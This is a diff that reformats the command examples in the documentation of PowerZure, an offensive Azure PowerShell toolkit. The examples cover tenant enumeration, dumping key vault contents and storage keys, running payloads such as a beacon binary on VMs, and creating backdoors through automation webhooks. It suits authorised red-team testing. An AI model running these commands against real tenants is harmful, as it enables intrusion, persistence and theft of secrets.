@@ -198,9 +198,12 @@ Examples
 
 ::
 
-   Get-CurrentUser`
+   Get-CurrentUser
 
-` Get-CurrentUser -All`
+
+::
+
+   Get-CurrentUser -All
 
 .. _required-modules-1:
 
@@ -240,7 +243,10 @@ List all Azure users in the tenant
 Syntax
 ^^^^^^
 
-`Get-AllUsers `
+
+::
+
+  Get-AllUsers 
 
 .. _description-2:
 
@@ -255,11 +261,20 @@ distinguished name, Principal name, and usertype.
 Examples
 ^^^^^^^^
 
-` Get-AllUsers `
 
-`Get-AllUsers -OutFile users.csv`
+::
 
-`Get-AllUsers -OutFile users.txt`
+   Get-AllUsers 
+
+
+::
+
+  Get-AllUsers -OutFile users.csv
+
+
+::
+
+  Get-AllUsers -OutFile users.txt
 
 .. _required-modules-2:
 
@@ -298,7 +313,10 @@ Lists the active roles in Azure AD and what users are part of the role.
 Syntax
 ^^^^^^
 
-`Get-AADRoleMembers`
+
+::
+
+  Get-AADRoleMembers
 
 .. _description-3:
 
@@ -312,7 +330,10 @@ Gathers the AAD role members. This is different than Azure RBAC roles.
 Examples
 ^^^^^^^^
 
-` Get-AADRoleMembers`
+
+::
+
+   Get-AADRoleMembers
 
 .. _required-modules-3:
 
@@ -352,7 +373,10 @@ Gathers info on a specific user
 Syntax
 ^^^^^^
 
-`Get-User -User Test@domain.com `
+
+::
+
+  Get-User -User Test@domain.com 
 
 .. _description-4:
 
@@ -367,7 +391,10 @@ account is enabled. Also lists the roles the user has in Azure RBAC.
 Examples
 ^^^^^^^^
 
-`Get-User -User Test@domain.com%60
+
+::
+
+  Get-User -User Test@domain.com%60
 
 .. _required-modules-4:
 
@@ -407,7 +434,10 @@ Gathers all the groups in the tenant
 Syntax
 ^^^^^^
 
-`Get-AllGroups`
+
+::
+
+  Get-AllGroups
 
 .. _description-5:
 
@@ -422,11 +452,20 @@ Gathers all the groups in the tenant
 Examples
 ^^^^^^^^
 
-`Get-AllGroups`
 
-`Get-AllGroups -OutFile users.csv`
+::
 
-`Get-AllGroups -OutFile users.txt `
+  Get-AllGroups
+
+
+::
+
+  Get-AllGroups -OutFile users.csv
+
+
+::
+
+  Get-AllGroups -OutFile users.txt 
 
 .. _parameters-5:
 
@@ -459,7 +498,10 @@ Lists all resources
 Syntax
 ^^^^^^
 
-`Get-Resources`
+
+::
+
+  Get-Resources
 
 .. _description-6:
 
@@ -473,7 +515,10 @@ Lists all the resources in the subscription that the user has access to.
 Examples
 ^^^^^^^^
 
-`Get-Resources`
+
+::
+
+  Get-Resources
 
 .. _parameters-6:
 
@@ -511,7 +556,10 @@ Returns all applications and their Ids
 Syntax
 ^^^^^^
 
-`Get-Apps`
+
+::
+
+  Get-Apps
 
 .. _description-7:
 
@@ -525,7 +573,10 @@ Returns all the applications in Azure AD and their IDs
 Examples
 ^^^^^^^^
 
-`Get-Apps`
+
+::
+
+  Get-Apps
 
 .. _parameters-7:
 
@@ -563,7 +614,10 @@ Gets all the members of a specific group. Group does NOT mean role.
 Syntax
 ^^^^^^
 
-`Get-GroupMembers -Group 'SQL Users' `
+
+::
+
+  Get-GroupMembers -Group 'SQL Users' 
 
 .. _description-8:
 
@@ -577,9 +631,15 @@ Will get the members of a specific AAD group.
 Examples
 ^^^^^^^^
 
-`Get-GroupMembers -Group 'SQL Users' `
 
-`Get-GroupMembers -Group 'SQL Users' -OutFile users.csv`
+::
+
+  Get-GroupMembers -Group 'SQL Users' 
+
+
+::
+
+  Get-GroupMembers -Group 'SQL Users' -OutFile users.csv
 
 .. _parameters-8:
 
@@ -623,7 +683,10 @@ Gathers all the group members of all the groups.
 Syntax
 ^^^^^^
 
-`Get-AllGroupMembers`
+
+::
+
+  Get-AllGroupMembers
 
 .. _description-9:
 
@@ -637,9 +700,15 @@ Goes through each group in AAD and lists the members.
 Examples
 ^^^^^^^^
 
-`Get-AllGroupMembers -OutFile members.txt `
 
-`Get-AllGroupMembers`
+::
+
+  Get-AllGroupMembers -OutFile members.txt 
+
+
+::
+
+  Get-AllGroupMembers
 
 .. _parameters-9:
 
@@ -679,7 +748,10 @@ Gets all the members of all roles. Roles does not mean groups.
 Syntax
 ^^^^^^
 
-`Get-AllRoleMembers`
+
+::
+
+  Get-AllRoleMembers
 
 .. _description-10:
 
@@ -693,13 +765,22 @@ Examples
 
 .. _get-allrolemembers-1:
 
-`Get-AllRoleMembers`
+
+::
+
+  Get-AllRoleMembers
 ^^^^^^^^^^^^^^^^^^^^^^
 
-`Get-AllRoleMembers -OutFile users.csv`
+
+::
+
+  Get-AllRoleMembers -OutFile users.csv
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-`Get-AllRoleMembers -OutFile users.txt`
+
+::
+
+  Get-AllRoleMembers -OutFile users.txt
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 .. _parameters-10:
@@ -740,7 +821,10 @@ Gets the members of a role.
 Syntax
 ^^^^^^
 
-`Get-RoleMembers -Role [Role name]`
+
+::
+
+  Get-RoleMembers -Role [Role name]
 
 .. _description-11:
 
@@ -755,7 +839,10 @@ Reader <---correct)
 Examples
 ^^^^^^^^
 
-`Get-RoleMembers -Role Reader`
+
+::
+
+  Get-RoleMembers -Role Reader
 
 .. _parameters-11:
 
@@ -795,7 +882,10 @@ Lists the roles of a specific user.
 Syntax
 ^^^^^^
 
-`Get-Roles -User [UPN] `
+
+::
+
+  Get-Roles -User [UPN] 
 
 .. _description-12:
 
@@ -809,7 +899,10 @@ Lists the Azure RBAC roles of a specific user based on their UPN.
 Examples
 ^^^^^^^^
 
-`Get-Roles -User john@contoso.com`
+
+::
+
+  Get-Roles -User john@contoso.com
 
 .. _parameters-12:
 
@@ -849,7 +942,10 @@ Returns all service principals
 Syntax
 ^^^^^^
 
-`Get-ServicePrincipals`
+
+::
+
+  Get-ServicePrincipals
 
 .. _description-13:
 
@@ -863,7 +959,10 @@ Returns all service principals in AAD.
 Examples
 ^^^^^^^^
 
-`Get-ServicePrincipals`
+
+::
+
+  Get-ServicePrincipals
 
 .. _parameters-13:
 
@@ -901,7 +1000,10 @@ Returns all info on a service principal
 Syntax
 ^^^^^^
 
-`Get-ServicePrincipal –id [SP ID]`
+
+::
+
+  Get-ServicePrincipal –id [SP ID]
 
 .. _description-14:
 
@@ -915,7 +1017,10 @@ Returns all details on a service principal via the SP’s ID.
 Examples
 ^^^^^^^^
 
-`Get-ServicePrincipal -id fdb54b57-a416-4115-8b21-81c73d2c2deb`
+
+::
+
+  Get-ServicePrincipal -id fdb54b57-a416-4115-8b21-81c73d2c2deb
 
 .. _parameters-14:
 
@@ -955,7 +1060,10 @@ Returns the permissions of an app
 Syntax
 ^^^^^^
 
-` Get-AppPermissions -Id [App ID]`
+
+::
+
+   Get-AppPermissions -Id [App ID]
 
 .. _description-15:
 
@@ -969,7 +1077,10 @@ Gathers the permissions an application has.
 Examples
 ^^^^^^^^
 
-`Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb`
+
+::
+
+  Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb
 
 .. _parameters-15:
 
@@ -1009,7 +1120,10 @@ Gets running webapps
 Syntax
 ^^^^^^
 
-`Get-WebApps`
+
+::
+
+  Get-WebApps
 
 .. _description-16:
 
@@ -1023,7 +1137,10 @@ Gathers the names of the running web applications
 Examples
 ^^^^^^^^
 
-`Get-WebApps`
+
+::
+
+  Get-WebApps
 
 .. _parameters-16:
 
@@ -1064,7 +1181,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-WebAppDetails -Name [WebAppName]`
+
+::
+
+  Get-WebAppDetails -Name [WebAppName]
 
 .. _description-17:
 
@@ -1078,7 +1198,10 @@ Gets the details of a web application
 Examples
 ^^^^^^^^
 
-`Get-WebAppDetails -Name AppName`
+
+::
+
+  Get-WebAppDetails -Name AppName
 
 .. _parameters-17:
 
@@ -1124,8 +1247,11 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-RunAsCertificate -ResourceGroup [RG Name] -AutomationAccount [AA
-Name]`
+
+::
+
+  Get-RunAsCertificate -ResourceGroup [RG Name] -AutomationAccount [AA
+Name]
 
 .. _description-18:
 
@@ -1143,8 +1269,11 @@ certificate.
 Examples
 ^^^^^^^^
 
-`Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount
-TestAccount`
+
+::
+
+  Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount
+TestAccount
 
 .. _parameters-18:
 
@@ -1196,7 +1325,10 @@ Permissions
 Syntax
 ^^^^^^
 
-` Get-AADRole -Role [Role]`
+
+::
+
+   Get-AADRole -Role [Role]
 
 .. _description-19:
 
@@ -1211,7 +1343,10 @@ Finds a specified AAD Role and its definitions. Role must be properly capitalize
 Examples
 ^^^^^^^^
 
-`Get-AADRole -Role 'Company Administrator'`
+
+::
+
+  Get-AADRole -Role 'Company Administrator'
 
 .. _parameters-19:
 
@@ -1256,7 +1391,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-AADRoleMembers`
+
+::
+
+  Get-AADRoleMembers
 
 .. _description-20:
 
@@ -1270,7 +1408,10 @@ Lists the active roles in Azure AD and what users are part of the role.
 Examples
 ^^^^^^^^
 
-`Get-AADRoleMembers`
+
+::
+
+  Get-AADRoleMembers
 
 .. _parameters-20:
 
@@ -1316,24 +1457,32 @@ Permissions
 Syntax
 ^^^^^^
 
-`Execute-Command -OS [OS] -ResourceGroup [RG Name] -VM [VM Name]
--Command [Command]`
+
+::
+
+  Execute-Command -OS [OS] -ResourceGroup [RG Name] -VM [VM Name]
+-Command [Command]
 
 .. _description-21:
 
 Description
 ^^^^^^^^^^^
 
-Executes a command on a virtual machine in Azure using `az vm
-run-command invoke`
+Executes a command on a virtual machine in Azure using 
+::
+
+  az vm run-command invoke
 
 .. _examples-21:
 
 Examples
 ^^^^^^^^
 
-`Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10
--Command whoami`
+
+::
+
+  Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10
+-Command whoami
 
 .. _parameters-21:
 
@@ -1342,7 +1491,7 @@ Parameters
 
 -OS
 
-Operating system, options are `Linux` or `Windows`
+Operating system, options are 'Linux' or 'Windows'
 
 -ResourceGroup
 
@@ -1392,8 +1541,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Execute-MSBuild -ResourceGroup [RG Name] -VM [Virtual Machine name]
--File [C:/path/to/payload/onyourmachine.xml]`
+
+::
+
+  Execute-MSBuild -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload/onyourmachine.xml]
 
 .. _description-22:
 
@@ -1401,15 +1552,21 @@ Description
 ^^^^^^^^^^^
 
 Uploads an MSBuild payload as a .ps1 script to the target VM then calls
-msbuild.exe with `az run-command invoke`.
+msbuild.exe with 
+
+::
+
+  az run-command invoke.
 
 .. _examples-22:
 
 Examples
 ^^^^^^^^
 
-`Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File
-C:tempbuild.xml`
+
+::
+
+  Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbuild.xml
 
 .. _parameters-22:
 
@@ -1468,8 +1625,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Execute-Program -ResourceGroup [RG Name] -VM [Virtual Machine name]
--File [C:/path/to/payload.exe]`
+
+::
+
+  Execute-Program -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload.exe]
 
 .. _description-23:
 
@@ -1477,8 +1636,13 @@ Description
 ^^^^^^^^^^^
 
 Takes a supplied binary, base64 encodes the byte stream to a file,
-uploads that file to the VM, then runs a command via `az run-command
-invoke` to decode the base64 byte stream to a .exe file, then executes
+uploads that file to the VM, then runs a command via
+ 
+::
+
+  az run-command invoke
+
+to decode the base64 byte stream to a .exe file, then executes
 the binary.
 
 .. _examples-23:
@@ -1489,7 +1653,7 @@ Examples
 
 ::
 	Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File
-C:tempbeacon.exe`
+C:tempbeacon.exe
 
 .. _parameters-23:
 
@@ -1544,9 +1708,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Create-Backdoor -Username [Username] -Password [Password]
--AutomationAccount [AA name] -ResourceGroup [RG Name] -NewUsername [New
-UN] -NewPassword [New Password]`
+
+::
+
+  Create-Backdoor -Username [Username] -Password [Password] -AutomationAccount [AA name] -ResourceGroup [RG Name] -NewUsername [New UN] -NewPassword [New Password]
 
 .. _description-24:
 
@@ -1566,10 +1731,11 @@ This requires an account that is part of the 'Administrators' Role
 Examples
 ^^^^^^^^
 
-`Create-Backdoor -Username Administrator@contoso.com -Password
-Password! -AutomationAccount AutomationAccountExample -ResourceGroup
-ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd
-`
+
+::
+
+  Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd
+
 
 .. _parameters-24:
 
@@ -1637,7 +1803,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Execute-Backdoor -URI [URI]`
+
+::
+
+  Execute-Backdoor -URI [URI]
 
 .. _description-25:
 
@@ -1651,8 +1820,10 @@ Executes the URI created by Create-Backdoor
 Examples
 ^^^^^^^^
 
-`Execute-Backdoor -URI
-https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d`
+
+::
+
+  Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d
 
 .. _parameters-25:
 
@@ -1699,8 +1870,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Execute-CommandRunbook -AutomationAccount [AA Name] -ResourceGroup [RG
-Name] -VM [VM Name] -Command [Command]`
+
+::
+
+  Execute-CommandRunbook -AutomationAccount [AA Name] -ResourceGroup [RGName] -VM [VM Name] -Command [Command]
 
 .. _description-26:
 
@@ -1716,11 +1889,15 @@ correct permissions over the VM.
 Examples
 ^^^^^^^^
 
-`Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup
-TestRG -VM Win10Test -Command whoami`
 
-`Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup
-TestRG -VM Win10Test -Script "C:temptest.ps1"`
+::
+
+  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami
+
+
+::
+
+  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Script "C:temptest.ps1"
 
 .. _parameters-26:
 
@@ -1784,8 +1961,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Upload-StorageContent -StorageAccount [Storage Account name] -Share
-[Storage share name] -File [File name to upload]`
+
+::
+
+  Upload-StorageContent -StorageAccount [Storage Account name] -Share [Storage share name] -File [File name to upload]
 
 .. _description-27:
 
@@ -1800,8 +1979,10 @@ account
 Examples
 ^^^^^^^^
 
-`Upload-StorageContent -StorageAccount TestName -Share TestShare -File
-secret.txt`
+
+::
+
+  Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt
 
 .. _parameters-27:
 
@@ -1856,7 +2037,10 @@ Permissions
 Syntax
 ^^^^^^
 
-` Stop-VM -VM [VM name] -ResourceGroup [RG] `
+
+::
+
+   Stop-VM -VM [VM name] -ResourceGroup [RG] 
 
 .. _description-28:
 
@@ -1870,7 +2054,10 @@ Stops a VM
 Examples
 ^^^^^^^^
 
-` Stop-VM -VM Example2016R2 -ResourceGroup Test_RG`
+
+::
+
+   Stop-VM -VM Example2016R2 -ResourceGroup Test_RG
 
 .. _parameters-28:
 
@@ -1910,7 +2097,10 @@ Starts a Virtual Machine
 
 **Syntax**
 
-` Start-VM -VM [VM name] -ResourceGroup [RG] `
+
+::
+
+   Start-VM -VM [VM name] -ResourceGroup [RG] 
 
 **Description**
 
@@ -1918,7 +2108,10 @@ Starts a VM
 
 **Examples**
 
-` Start-VM -VM Example2016R2 -ResourceGroup Test_RG`
+
+::
+
+   Start-VM -VM Example2016R2 -ResourceGroup Test_RG
 
 **Parameters**
 
@@ -1954,7 +2147,10 @@ Restarts a Virtual Machine
 
 **Syntax**
 
-` Restart-VM -VM [VM name] -ResourceGroup [RG] `
+
+::
+
+   Restart-VM -VM [VM name] -ResourceGroup [RG] 
 
 **Description**
 
@@ -1962,7 +2158,10 @@ Restarts a VM
 
 **Examples**
 
-` Restart-VM -VM Example2016R2 -ResourceGroup Test_RG`
+
+::
+
+   Restart-VM -VM Example2016R2 -ResourceGroup Test_RG
 
 **Parameters**
 
@@ -2005,8 +2204,10 @@ Permissions
 Syntax
 ^^^^^^
 
-` Start-Runbook -Account [Automation Account name] -ResourceGroup
-[Resource Group name] -Runbook [Runbook name] `
+
+::
+
+   Start-Runbook -Account [Automation Account name] -ResourceGroup [Resource Group name] -Runbook [Runbook name] 
 
 .. _description-29:
 
@@ -2020,8 +2221,10 @@ Starts a specified Runbook
 Examples
 ^^^^^^^^
 
-` Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook
-TestRunbook `
+
+::
+
+   Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook 
 
 .. _parameters-29:
 
@@ -2076,7 +2279,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Set-Role -Role Owner -User [UPN] -Resource [Resource name]`
+
+::
+
+  Set-Role -Role Owner -User [UPN] -Resource [Resource name]
 
 .. _description-30:
 
@@ -2090,9 +2296,15 @@ Sets a role over a resource or subscription.
 Examples
 ^^^^^^^^
 
-`Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM`
 
-`Set-Role -Role Owner -User john@contoso.com -Subscription SubName`
+::
+
+  Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM
+
+
+::
+
+  Set-Role -Role Owner -User john@contoso.com -Subscription SubName
 
 .. _parameters-30:
 
@@ -2140,7 +2352,10 @@ Removes a user from a role for a specific resource or subscription
 
 **Syntax**
 
-`Set-Role -Role Owner -User [UPN] -Resource [Resource name]`
+
+::
+
+  Set-Role -Role Owner -User [UPN] -Resource [Resource name]
 
 **Description**
 
@@ -2148,9 +2363,15 @@ Removes a role over a resource or subscription.
 
 **Examples**
 
-`Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM`
 
-`Remove-Role -Role Owner -User john@contoso.com -Subscription SubName`
+::
+
+  Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM
+
+
+::
+
+  Remove-Role -Role Owner -User john@contoso.com -Subscription SubName
 
 **Parameters**
 
@@ -2201,7 +2422,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Set-Group -User [UPN] -Group [Group name]`
+
+::
+
+  Set-Group -User [UPN] -Group [Group name]
 
 .. _description-31:
 
@@ -2216,7 +2440,10 @@ name in single quotes.
 Examples
 ^^^^^^^^
 
-`Set-Group -User john@contoso.com -Group 'SQL Users' `
+
+::
+
+  Set-Group -User john@contoso.com -Group 'SQL Users' 
 
 .. _parameters-31:
 
@@ -2265,7 +2492,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Set-Password -Username [UPN] -Password [new password]`
+
+::
+
+  Set-Password -Username [UPN] -Password [new password]
 
 .. _description-32:
 
@@ -2279,7 +2509,10 @@ Sets a user’s password. Requires AAD PS Module.
 Examples
 ^^^^^^^^
 
-`Set-Password -Username john@contoso.com -Password newpassw0rd1`
+
+::
+
+  Set-Password -Username john@contoso.com -Password newpassw0rd1
 
 .. _parameters-32:
 
@@ -2333,7 +2566,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-KeyVaults`
+
+::
+
+  Get-KeyVaults
 
 .. _description-33:
 
@@ -2347,7 +2583,10 @@ Gathers the Keyvaults in the subscription
 Examples
 ^^^^^^^^
 
-`Get-KeyVaults`
+
+::
+
+  Get-KeyVaults
 
 .. _parameters-33:
 
@@ -2390,7 +2629,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-KeyVaultContents -Name [VaultName] `
+
+::
+
+  Get-KeyVaultContents -Name [VaultName] 
 
 .. _description-34:
 
@@ -2406,7 +2648,10 @@ re-edits the policy and removes your access.
 Examples
 ^^^^^^^^
 
-`Get-KeyVaultContents -Name TestVault`
+
+::
+
+  Get-KeyVaultContents -Name TestVault
 
 .. _parameters-34:
 
@@ -2452,7 +2697,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-AllKeyVaultContents`
+
+::
+
+  Get-AllKeyVaultContents
 
 .. _description-35:
 
@@ -2468,7 +2716,10 @@ policies to remove the user from the access policy.
 Examples
 ^^^^^^^^
 
-`Get-AllKeyVaultContents`
+
+::
+
+  Get-AllKeyVaultContents
 
 .. _parameters-35:
 
@@ -2514,7 +2765,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-StorageAccounts`
+
+::
+
+  Get-StorageAccounts
 
 .. _description-36:
 
@@ -2528,7 +2782,10 @@ Gets a list of storage account blobs
 Examples
 ^^^^^^^^
 
-`Get-StorageAccounts`
+
+::
+
+  Get-StorageAccounts
 
 .. _parameters-36:
 
@@ -2573,8 +2830,11 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-StorageAccountKeys -ResourceGroup [Resource Group name] -Account
-[StorageAccountName]`
+
+::
+
+  Get-StorageAccountKeys -ResourceGroup [Resource Group name] -Account
+[StorageAccountName]
 
 .. _description-37:
 
@@ -2589,8 +2849,11 @@ storage account.
 Examples
 ^^^^^^^^
 
-`Get-StorageAccountKeys -ResourceGroup MyGroup -Account
-StorageAccountName -kerb `
+
+::
+
+  Get-StorageAccountKeys -ResourceGroup MyGroup -Account
+StorageAccountName -kerb 
 
 .. _parameters-37:
 
@@ -2645,8 +2908,11 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-StorageContents -StorageAccount [Storage account name]
--ResourceGroup [Resource group name] -File [File name]`
+
+::
+
+  Get-StorageContents -StorageAccount [Storage account name]
+-ResourceGroup [Resource group name] -File [File name]
 
 .. _description-38:
 
@@ -2662,8 +2928,11 @@ the Storage Account's key.
 Examples
 ^^^^^^^^
 
-` Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
--File secret.txt -NoDelete`
+
+::
+
+   Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
+-File secret.txt -NoDelete
 
 .. _parameters-38:
 
@@ -2724,7 +2993,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-Runbooks`
+
+::
+
+  Get-Runbooks
 
 .. _description-39:
 
@@ -2740,7 +3012,10 @@ under.
 Examples
 ^^^^^^^^
 
-`Get-Runbooks`
+
+::
+
+  Get-Runbooks
 
 .. _parameters-39:
 
@@ -2786,8 +3061,11 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-RunbookContent -Account [AutomationAccountName] -ResourceGroup
-[ResourceGroupName] -Runbook [Runbook name]`
+
+::
+
+  Get-RunbookContent -Account [AutomationAccountName] -ResourceGroup
+[ResourceGroupName] -Runbook [Runbook name]
 
 .. _description-40:
 
@@ -2799,14 +3077,23 @@ Description
 Examples
 ^^^^^^^^
 
-`Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
-TestGroup -Runbook TestBook`
 
-`Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
-TestGroup -Runbook TestBook -Slot "Published"`
+::
 
-`Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
-TestGroup -Runbook TestBook -Slot "Draft"`
+  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
+TestGroup -Runbook TestBook
+
+
+::
+
+  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
+TestGroup -Runbook TestBook -Slot "Published"
+
+
+::
+
+  Get-RunbookContent -Account AutomationAccountexample -ResourceGroup
+TestGroup -Runbook TestBook -Slot "Draft"
 
 .. _parameters-40:
 
@@ -2869,7 +3156,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-AvailableVMDisks`
+
+::
+
+  Get-AvailableVMDisks
 
 .. _description-41:
 
@@ -2883,7 +3173,10 @@ Lists the VM disks available in the subscription
 Examples
 ^^^^^^^^
 
-`Get-AvailableVMDisks`
+
+::
+
+  Get-AvailableVMDisks
 
 .. _parameters-41:
 
@@ -2927,7 +3220,10 @@ Permissions
 Syntax
 ^^^^^^
 
-` Get-VMDisk -DiskName [Disk name] -ResourceGroup [RG Name]`
+
+::
+
+   Get-VMDisk -DiskName [Disk name] -ResourceGroup [RG Name]
 
 .. _description-42:
 
@@ -2943,9 +3239,12 @@ probably going to be many GBs in size. Hope you have fiber!
 Examples
 ^^^^^^^^
 
-` Get-VMDisk -DiskName
+
+::
+
+   Get-VMDisk -DiskName
 AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup
-TestGroup`
+TestGroup
 
 .. _parameters-42:
 
@@ -2994,7 +3293,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-VMs`
+
+::
+
+  Get-VMs
 
 .. _description-43:
 
@@ -3009,7 +3311,10 @@ well their running state
 Examples
 ^^^^^^^^
 
-`Get-VMs`
+
+::
+
+  Get-VMs
 
 .. _parameters-43:
 
@@ -3052,7 +3357,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Get-SQLDBs`
+
+::
+
+  Get-SQLDBs
 
 .. _description-44:
 
@@ -3068,7 +3376,10 @@ is to login via portal and use the preview browser.
 Examples
 ^^^^^^^^
 
-`Get-SQLDBs`
+
+::
+
+  Get-SQLDBs
 
 .. _parameters-44:
 
@@ -3115,7 +3426,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`Set-Subscription -Id [Subscription ID]`
+
+::
+
+  Set-Subscription -Id [Subscription ID]
 
 .. _description-45:
 
@@ -3129,7 +3443,10 @@ Sets the default subscription
 Examples
 ^^^^^^^^
 
-`Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0`
+
+::
+
+  Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0
 
 .. _parameters-45:
 
@@ -3177,7 +3494,10 @@ Permissions
 Syntax
 ^^^^^^
 
-`PowerZure -h`
+
+::
+
+  PowerZure -h
 
 .. _description-46:
 
@@ -3191,7 +3511,10 @@ Displays info about this script.
 Examples
 ^^^^^^^^
 
-`PowerZure -h`
+
+::
+
+  PowerZure -h
 
 .. _parameters-46:
 
